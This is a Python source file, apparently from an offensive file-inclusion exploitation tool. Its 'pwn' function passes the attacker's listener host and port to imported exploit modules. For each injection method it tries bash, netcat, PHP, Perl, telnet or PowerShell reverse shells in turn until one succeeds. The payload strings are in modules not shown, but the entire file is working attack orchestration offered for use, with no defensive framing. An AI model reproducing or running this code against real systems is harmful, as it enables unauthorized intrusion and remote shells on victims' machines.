# Import exploit modules
from src.attacks.bash import exploit_bash
from src.attacks.nc import exploit_nc
from src.attacks.php import exploit_php
from src.attacks.perl import exploit_perl
from src.attacks.telnet import exploit_telnet
from src.attacks.rfi import test_rfi
from src.attacks.rfi import exploit_rfi
from src.attacks.powershell import exploit_powershell
from src.utils.arguments import args
from src.httpreqs.post import POST
from src.httpreqs.get import GET

def pwn(exploit):
    
    ip = args.lhost
    port = args.lport
    
    method = exploit['ATTACK_METHOD']

    if(method == "INPUT"):
        if(exploit['OS'] == "linux"):
            if(exploit_bash(exploit, "INPUT", ip, port)): return
            if(exploit_nc(exploit, "INPUT", ip, port)): return
            if(exploit_php(exploit, "INPUT", ip, port)): return
            if(exploit_perl(exploit, "INPUT", ip, port)): return
            if(exploit_telnet(exploit, "INPUT", ip, port)): return
        else:
            if(exploit_powershell(exploit, "INPUT", ip, port)): return   

    elif(method == "DATA"):
        if(exploit['OS'] == "linux"):
            if(exploit_bash(exploit, "DATA", ip, port)): return
            if(exploit_nc(exploit, "DATA", ip, port)): return
            if(exploit_php(exploit, "DATA", ip, port)): return
            if(exploit_perl(exploit, "DATA", ip, port)): return
            if(exploit_telnet(exploit, "DATA", ip, port)): return
        else:
            if(exploit_powershell(exploit, "DATA", ip, port)): return

    elif(method == "EXPECT"):
        if(exploit['OS'] == "linux"):
            if(exploit_bash(exploit, "EXPECT", ip, port)): return
            if(exploit_nc(exploit, "EXPECT", ip, port)): return
            if(exploit_php(exploit, "EXPECT", ip, port)): return
            if(exploit_perl(exploit, "EXPECT", ip, port)): return
            if(exploit_telnet(exploit, "EXPECT", ip, port)): return
        else:
            if(exploit_powershell(exploit, "EXPECT", ip, port)): return 

    elif(method == "RFI"):
        if(exploit_rfi(exploit, "RFI", ip, port)): return
    
    elif(method == "TRUNC"):
        if(exploit['OS'] == "linux"):
            if(exploit_bash(exploit, "TRUNC", ip, port)): return
            if(exploit_nc(exploit, "TRUNC", ip, port)): return
            if(exploit_php(exploit, "TRUNC", ip, port)): return
            if(exploit_perl(exploit, "TRUNC", ip, port)): return
            if(exploit_telnet(exploit, "TRUNC", ip, port)): return
        else:
            if(exploit_powershell(exploit, "TRUNC", ip, port)): return
    
    elif(method == "CMD"):
        if(exploit['OS'] == "linux"):
            if(exploit_bash(exploit, "CMD", ip, port)): return
            if(exploit_nc(exploit, "CMD", ip, port)): return
            if(exploit_php(exploit, "CMD", ip, port)): return
            if(exploit_perl(exploit, "CMD", ip, port)): return
            if(exploit_telnet(exploit, "CMD", ip, port)): return
        else:
            if(exploit_powershell(exploit, "CMD", ip, port)): return